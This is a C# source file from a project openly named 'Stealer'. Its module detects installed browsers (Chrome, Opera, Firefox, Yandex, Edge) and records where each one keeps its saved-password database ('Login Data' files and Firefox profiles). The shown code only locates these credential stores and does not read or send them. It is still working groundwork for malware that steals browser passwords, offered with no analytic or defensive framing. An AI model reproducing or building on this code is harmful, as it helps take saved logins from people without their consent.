using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Stealer
{
    public enum BrowserType
    {
        Chrome = 0,
        IE = 1,
        Mozilla = 2,
        Opera = 3,
        Edge = 4,
        Yandex = 5
    }

    public struct BrowserInfo
    {
        public string Path;
        public string PathToUserData;
        public BrowserType Type;
    }

    public static class BrowserSearcher
    {

        public static List<BrowserInfo> DetectBrowsers()
        {
            List<BrowserInfo> browsers = new List<BrowserInfo>();
            var filePath = GetPathToBrowsers();
            string[] directories = Directory.GetDirectories(filePath + @"\AppData\Local");
            IsBrowserAvaible("Mozilla", BrowserType.Mozilla, browsers, directories);
            IsBrowserAvaible("Opera", BrowserType.Opera, browsers, directories);
            IsBrowserAvaible("Google", BrowserType.Chrome, browsers, directories);
            IsBrowserAvaible("Yandex", BrowserType.Yandex, browsers, directories);
            IsBrowserAvaible("MicrosoftEdge", BrowserType.Edge, browsers, directories);
            return browsers;
        }

        private static string GetPathToBrowsers()
        {
            string pathWithEnv = @"%USERPROFILE%";
            string filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            return filePath;
        }
        private static List<string> GetDirectories(string path, bool recursive, string predicate = null)
        {
            var result = new List<string>();
            if (recursive)
            {
                try
                {
                    if (predicate == null)
                        result.AddRange(Directory.GetDirectories(path));
                    else result.AddRange(Directory.GetDirectories(path).Where(c => c.ToLower().Contains(predicate.ToLower())));
                    foreach (var child in Directory.GetDirectories(path))
                    {
                        if (predicate == null)
                            result.AddRange(GetDirectories(child, recursive, predicate));
                        else result.AddRange(GetDirectories(child, recursive, predicate).Where(c => c.ToLower().Contains(predicate.ToLower())));
                    }
                }
                catch (UnauthorizedAccessException ex)
                {
                }

            }
            return result;
        }

        private static void IsBrowserAvaible(string name, BrowserType browser, List<BrowserInfo> browsers, string[] directories)
        {
            if (directories.Where(x => x.Contains(name)).Count() > 0)
            {
                var Browser = new BrowserInfo()
                {
                    Type = browser,
                    Path = directories.FirstOrDefault(c => c.Contains(name)),
                };
                if (browser == BrowserType.Chrome)
                    Browser.PathToUserData = Browser.PathToUserData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Login Data");
                if (browser == BrowserType.Opera)
                    Browser.PathToUserData = Browser.PathToUserData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable\Login Data");
                if (browser == BrowserType.Mozilla)
                    Browser.PathToUserData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox\Profiles");
                if (browser == BrowserType.Yandex)
                    Browser.PathToUserData = Browser.PathToUserData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Yandex\YandexBrowser\User Data\Default\Login Data");
                browsers.Add(Browser);
            }
        }
    }
}